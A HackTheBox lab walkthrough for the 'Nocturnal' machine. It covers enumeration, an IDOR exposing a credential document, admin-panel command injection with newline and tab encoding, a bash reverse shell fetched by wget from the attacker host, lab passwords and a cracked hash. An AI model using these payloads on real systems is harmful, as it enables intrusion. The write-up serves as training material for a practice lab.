---
categories:
  - HackTheBox
image:
  path: /assets/posts/Nocturnal/preview.png
layout: post
stags:
title: Nocturnal (Easy)
---

**Nocturnal** is an Easy-rated Linux machine from HackTheBox that requires combining web exploitation with credential reuse to escalate privileges. Initial access is obtained through an **IDOR vulnerability** in the file download functionality, which exposes an `.odt` document containing valid credentials. With these, we gain access to the admin panel, where a poorly sanitized backup feature allows **command injection** and leads to a foothold on the system. Enumeration of the local database reveals password reuse for a user .Finally, an internal service on port 8080 is discovered, running a vulnerable application affected by **CVE-2023-46818**, which is exploited to achieve root access and complete the box.
Let's dive in.

---

## Enumeration

```bash
`nmap -sC -sV -oN nmap.txt 10.10.11.64`
```
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-20 10:46 EEST
Nmap scan report for 10.10.11.64
Host is up (0.094s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.35 seconds
```
We have only 2 ports open ssh and nginx - we got redirected to http://nocturnal.htb/ so let's add it to the hosts file
```bash
10.10.11.64 nocturnal.htb
```

## Initial Foothold
### User Registration & File Upload
The site allows user registration. After creating an account, we can upload files with limited extensions:
```bash
pdf, doc, docx, xls, xlsx, odt
```

![](/assets/posts/Nocturnal/Nocturnal,-1.png)

so I will upload a random pdf and see what we get 

![](/assets/posts/Nocturnal/Nocturnal,-2.png)
just the in our profile let's see what does clicking on the pdf get's us 

![](/assets/posts/Nocturnal/Nocturnal,-3.png)
So there are 2 parameters username and the file we want to download which will return the contents of the file that we have let's see if we could make the request with just the username 

![](/assets/posts/Nocturnal/Nocturnal,-4.png)
That didn't work what about using a pdf that does not exist
![](/assets/posts/Nocturnal/Nocturnal,-5.png)
why got a list of the pdf that I have that got me thinking what if there is an IDOR and we could see other people uploaded files so let's fuzz usernames and see what we get 

I will use ffuf to fuzz for username and the wordlist xato-net-10-miliion-usernames
```bash
ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=anything.pdf' -H 'Cookie: PHPSESSID=iau9sjst5sf05fel3i63ilc071' -w /opt/SecLists-master/Usernames/xato-net-10-million-usernames.txt -fs 2985
```

![](/assets/posts/Nocturnal/Nocturnal,-6.png)
and we got 3 potential users

![](/assets/posts/Nocturnal/Nocturnal,-7.png)
Looking at Amanda we could find that she has a file called privacy.odt let's try and download this file and see what we got

I will unzip the odt to see what's inside  
```bash
unzip privacy.odt 
Archive:  privacy.odt
 extracting: mimetype                
   creating: Configurations2/accelerator/
   creating: Configurations2/images/Bitmaps/
   creating: Configurations2/toolpanel/
   creating: Configurations2/floater/
   creating: Configurations2/statusbar/
   creating: Configurations2/toolbar/
   creating: Configurations2/progressbar/
   creating: Configurations2/popupmenu/
   creating: Configurations2/menubar/
  inflating: styles.xml              
  inflating: manifest.rdf            
  inflating: content.xml             
  inflating: meta.xml                
  inflating: settings.xml            
 extracting: Thumbnails/thumbnail.png  
  inflating: META-INF/manifest.xml   
```

![](/assets/posts/Nocturnal/Nocturnal,-8.png)

we could find this image which is the thumbnail we could read what the IT team is saying but the password isn't very visible luckly  the password is inside content.xml which is 
***arHkG7HAI68X8s1J***

## Admin Access
now we have amanda login credentials 

![](/assets/posts/Nocturnal/Nocturnal,-9.png)

She has access to the admin panel we also could see the source code of the site 

![](/assets/posts/Nocturnal/Nocturnal,-11.png)
in admin.php there is this backup file functionality and if we look closely we could see that it might be vulnerable to command injection 
![](/assets/posts/Nocturnal/Nocturnal,-12.png)
we just need to bypass this cleanEntry function or just CRLF to execute commands on a new line so let's see what could we do 

space is a blacklisted charecter so I used TAB instead, with the encoding of %09
tried this payload to test 
```bash
ttest%0aping%09-c%094%0910.10.16.8%09%0a 
```
unencoded is just
```bash
ttest
ping	-c	4	10.10.16.8	
```
![](/assets/posts/Nocturnal/Nocturnal,-13.png)
so let's write a reverse shell

I will download the shell and then execute it since it has blacklisted characters 
```bash
# In a file called shell
bash -i >& /dev/tcp/IP/PORT 0>&1

# To download the shell we will send Chanege IP and Port
password=%0abash%09-c%09"wget%09IP:PORT/shell"%0a&backup=&backup=
# and now we will execute the shell
password=%0Abash%09-c%09"bash%09shell"%0A&backup=
```

![](/assets/posts/Nocturnal/Nocturnal,-14.png)
the database in a folder called nocturnal_database after dumping the database we could find the passwords of the users on the site let's try and crack tobias password since he is on the box

```bash
55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse
```

we got it as  ***slowmotionapocalypse***
![](/assets/posts/Nocturnal/Nocturnal,-15.png)

## Root
![](/assets/posts/Nocturnal/Nocturnal,-16.png)
There is a service running on port 8080 internally let's forward the port and see what's in there
```bash
~C
-L 8081:localhost:8080
```

we could login with admin:slowmotionapocalypse
### CVE-2023-46818
This version is vulnerable to php code injection 
![](/assets/posts/Nocturnal/Nocturnal,-17.png)
and that's it